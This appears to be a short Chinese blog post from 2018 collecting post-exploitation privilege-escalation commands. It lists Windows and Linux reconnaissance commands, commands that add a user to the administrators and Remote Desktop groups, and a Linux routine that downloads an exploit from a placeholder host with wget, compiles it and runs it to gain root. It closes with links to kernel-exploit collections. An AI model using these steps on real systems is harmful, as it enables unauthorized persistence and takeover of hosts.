---
layout: post
title: "内网提权命令"
date: 2018-09-07
category: web安全
tags: web安全
---

## Windows基础命令

	net user xx

	query user #查看用户登录情况

	whoami #当前用户权限

	systeminfo #查看当前系统版本与补丁信息

	net user xx 123456 /add #添加用户

	net localgroup administrators xx /add #添加到管理员组

	net localgroup "Remote Desktop Users" xx /add #如远程桌面连接不上那么添加远程桌面组

	ipconfig #查看本机ip信息，可加 /all 参数

	netstat -ano #查看端口情况

	dir c:\ #查看目录

	type c:\Users\admin\Desktop\1.txt #查看指定位置文件内容，一般为文本文件

	echo 字符串>2.txt #写入文本到文件。特殊字符如<>等前面加^

	copy 1.txt 3.php #复制文件

	rename d:\2.txt mspaint.bat #将某个路径下的文件重命名

	tasklist #查看所有进程占用的端口

	taskkill /im xx.ext /f #强制结束指定进程 如 taskkill /im QQMusic.exe /f


## Windows基础提权命令

	查看系统信息
	systeminfo|findstr /B/C:"OS名称"/C:"OS版本"

	主机名
	Hostname

	环境变量
	Set

	查看用户信息
	Net user
	Net1 user

	查看服务pid号
	Tasklist/svc|find "TermService"
	netstat -ano|find "1488"

	查看系统名
	wmic os get caption

	查看补丁信息
	wmic dfe get Description,HotFixID,InstalledOn|findstr /C:"KB4013389" /C:"KB958644"

	查看当前安装程序
	wmic product get name,version

## Linux基础命令

	查看系统版本信息
		cat /etc/issue
		cat /etc/*-release
	查看内核版本
		uname -a



## Linux提权基础命令

	基础命令：
	uname -an
	id
	pwd
	cat /etc/issue

	套路：
	wget http://exp/exp.c
	gcc -o exp exp.c
	chmod +x exp
	./exp
	...到root

## LINK

[【权限提升】Linux 提权常用命令集](https://zhuanlan.zhihu.com/p/42358253)  
[SecWikiGithub](https://github.com/SecWiki)  
[SecWiki](https://www.sec-wiki.com/)  
[Exploit-db本地提权](https://www.exploit-db.com/local/)  
[Windows提权漏洞集合](https://github.com/SecWiki/windows-kernel-exploits)  
[Linux提权漏洞集合](https://github.com/SecWiki/linux-kernel-exploits)  
[Mac-OS提权漏洞集合](https://github.com/SecWiki/macos-kernel-exploits)  




